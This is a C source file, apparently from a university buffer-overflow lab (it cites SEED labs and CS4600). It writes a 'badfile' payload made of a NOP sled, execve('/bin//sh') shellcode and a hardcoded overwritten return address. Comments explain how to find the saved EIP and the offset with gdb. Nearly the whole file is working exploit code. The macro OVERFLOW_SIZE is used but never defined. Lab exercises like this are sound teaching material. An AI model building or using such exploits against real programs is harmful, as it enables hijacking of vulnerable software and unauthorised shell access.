/*  exploit.c */

/* A program that creates a file containing code for launching shell*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define DEFAULT_OFFSET 350 

char shellcode[]=
"\x31\xc0"              /* xorl    %eax,%eax              */
"\x50"                  /* pushl   %eax                   */
"\x68""//sh"            /* pushl   $0x68732f2f            */
"\x68""/bin"            /* pushl   $0x6e69622f            */
"\x89\xe3"              /* movl    %esp,%ebx              */
"\x50"                  /* pushl   %eax                   */
"\x53"                  /* pushl   %ebx                   */
"\x89\xe1"              /* movl    %esp,%ecx              */
"\x99"                  /* cdql                           */
"\xb0\x0b"              /* movb    $0x0b,%al              */    
"\xcd\x80"              /* int     $0x80                  */
;

unsigned long get_sp(void)
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[OVERFLOW_SIZE]; /* originally 517 in SEED labs */
    FILE *badfile;
    char *ptr;
    long *a_ptr,ret;

    int offset = DEFAULT_OFFSET;
    int codeSize = sizeof(shellcode);
    int buffSize = sizeof(buffer);

    printf(" Executing Exploit \n");

    if(argc > 1) offset = atoi(argv[1]); //allow command line input

/*--------Initialize buffer with 0x90 (NOP instruction)--------*/

    memset(buffer, 0x90, buffSize);

/*----------------------BEGIN FILL BUFFER----------------------*/

    // Original CS4600 code - get stack pointer value
    // add offset to create the return address
    //ret = get_sp()+offset;
    //printf("   Return Address: \t 0x%x\n",get_sp());
    //printf("   Address: \t\t 0x%x\n",ret);
    //ptr = buffer;
    //a_ptr = (long *) ptr;
    //Fill the buffer with that address from the start
    //Note: this will no longer work if buffer is not at
    //      the precise word boundary
    //int i;
    //for (i = 0; i < 300;i+=4)
    //{
    //    *(a_ptr++) = ret;
    //}

    // Step 1:
    // Figure out how to get modified return address:
    // run gdb stack and do the following in gdb:
    // break main               -- this allow code stepping
    // s                        -- to single step code
    // s                        -- step until in the bof() function
    // info frame               -- get info frame : note on save registers eip
    // compute return address base on save eip
    // (add some offset to account for variables)
    // Example: the saved eip is 0xffffd4fc
    // add offset of 0x44
    // the return address should be oxffffd540 = (0xffffd4fc + 0x44)
    ret = (long)0xffffd540;
    printf("   Directly set Address: \t\t 0x%x\n",ret);

    // Step 2:
    // Figure out overflow return address on stack with
    // the new modified return address
    // 
    // 2.a. figure out how many bytes to offset:
    //      get the buffer address: - in gdb do:
    //      print &buffer       -- this should return the address of buffer
    // 2.b. compute the offset: saved eip - buffer
    // Example:
    // with original buffer size of 12 the address is 0xffffd4e4
    // skip the first (0xffffd4fc - 0xffffd4e4) = 0x18 (24 bytes)
    // Note: this method (i.e., doing calculation) will still work if
    //       the buffer address is not at word boundary
    ptr = buffer;
    a_ptr = (long *) (ptr + 24);  // This matches computation above
    *(a_ptr) = ret;

    int i;
    // Fill the destination (the modified return address)
    // with the exploit code
    // Note: 0x44 above == 68 in decimal
    //for(i = 486;i < codeSize + 486;++i)
    for(i = 68;i < codeSize + 68;++i)
    {
        //buffer[i] = shellcode[i-486];
        buffer[i] = shellcode[i-68];
    }
    buffer[buffSize - 1] = '\0';
/*-----------------------END FILL BUFFER-----------------------*/


/* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer,OVERFLOW_SIZE,1,badfile); /* originally 517 in SEED labs */
    fclose(badfile);    
}
